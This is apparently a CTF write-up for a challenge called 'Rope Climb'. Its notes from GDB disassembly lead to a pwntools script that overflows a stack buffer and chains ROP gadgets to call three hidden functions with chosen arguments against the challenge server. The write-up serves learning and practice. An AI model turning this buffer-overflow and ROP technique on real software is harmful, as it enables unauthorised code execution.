# Rope Climb

Observations from GDB `disas`:

1. `main()` calls `vuln()`, which simply reads input from stdin
2. There are functions `camp1()`, `camp2()`, `summit()` which are not being called in natural flow of the program. All three of these functions execute `fread` and then print the contents, possibly 3 parts of the flag. We need to construct a ROP chain.
3. `disas` each function to know:
    - vuln - input starts at **rbp-0x30**
    - camp1 - takes no args
    - camp2 - arg1: must be 0x67
    - summit - arg1: must be 0x63, arg2: must be 0x7466
4. `ROPgadget --binary ./chal` -> addresses of required gadgets

> It's always better add a RET gadget before every function call to be safe from any stack alignment issues

```python
from pwn import *

p = remote('climb.2024-bq.ctfcompetition.com',1337)
p.recvuntil(b'(Maybe some rope would help?)\n')

offset = 0x38
camp1 = 0x00000000004011d7
camp2 = 0x0000000000401253
summit = 0x00000000004012f3
pop_rdi_ret = 0x000000000040118a
pop_rsi_ret = 0x000000000040118c
ret = 0x0000000000401016

payload = offset*b'a'
payload += p64(ret) # Stack alignment
payload += p64(camp1)
payload += p64(pop_rdi_ret) + p64(0x67)
payload += p64(ret) # Stack alignment
payload += p64(camp2)
payload += p64(pop_rdi_ret) + p64(0x63)
payload += p64(pop_rsi_ret) + p64(0x7466)
payload += p64(ret) # Stack alignment
payload += p64(summit)

p.sendline(payload)
p.interactive()
```
